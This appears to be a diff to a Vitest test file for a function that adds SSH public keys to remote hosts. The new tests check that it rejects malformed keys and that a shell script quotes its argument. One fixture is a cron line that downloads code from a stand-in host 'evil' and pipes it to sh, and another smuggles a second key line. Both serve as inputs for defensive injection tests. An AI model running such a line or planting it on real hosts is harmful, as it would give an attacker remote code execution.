@@ -1,7 +1,9 @@
 import { describe, expect, it, vi, beforeEach } from "vitest";
 import { addKeyToHost, DEFAULT_EXPORT_SCRIPT } from "./keyExport";
 
-const getSecret = vi.fn(async (..._a: unknown[]) => "ssh-ed25519 AAAA... user@host\n");
+const PUB_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHqW1p3nMuFvR5NHqhkxLQKfDVZ2VYFOxKvL8dW7dSpq user@host";
+
+const getSecret = vi.fn(async (..._a: unknown[]) => `${PUB_KEY}\n`);
 const sshExecCommand = vi.fn(async (..._a: unknown[]) => ({ stdout: "", stderr: "", exit_code: 0 }));
 const resolveConnectionCredentials = vi.fn(async (..._a: unknown[]) => ({
   username: "root", password: undefined, privateKey: "pk", passphrase: undefined,
@@ -83,7 +85,7 @@ describe("addKeyToHost", () => {
   });
 
   it("throws on a multi-line public key instead of shipping it, and never calls sshExecCommand", async () => {
-    getSecret.mockResolvedValueOnce("ssh-ed25519 AAAA...\nssh-ed25519 BBBB...attacker" as never);
+    getSecret.mockResolvedValueOnce(`${PUB_KEY}\nssh-ed25519 AAAAB3attacker` as never);
     await expect(addKeyToHost({ sshKey, connection })).rejects.toThrow();
     expect(sshExecCommand).not.toHaveBeenCalled();
   });
@@ -94,5 +96,19 @@ describe("addKeyToHost", () => {
     const { command } = sshExecCommand.mock.calls[0][0] as any;
     expect(command).toContain("'# x ssh-ed25519 AAAA…attacker Key by Voltius'");
     expect(command).not.toMatch(/# x\nssh-ed25519/);
+  });
+
+  it("throws on a public key that is not one, so it cannot be written to the remote file", async () => {
+    // key_add_to_host's script supplies the line break itself, so one line of
+    // attacker-chosen content is a working cron entry or shell rc line.
+    getSecret.mockResolvedValueOnce("* * * * * root curl http://evil/x|sh" as never);
+    await expect(addKeyToHost({ sshKey, connection })).rejects.toThrow();
+    expect(sshExecCommand).not.toHaveBeenCalled();
+  });
+
+  it("quotes $1 in the default script so a glob in location is not expanded", () => {
+    expect(DEFAULT_EXPORT_SCRIPT).toContain('test ! -e "$1"');
+    expect(DEFAULT_EXPORT_SCRIPT).toContain('mkdir -p "$1"');
+    expect(DEFAULT_EXPORT_SCRIPT).not.toMatch(/-[ep] \$1/);
   });
 });
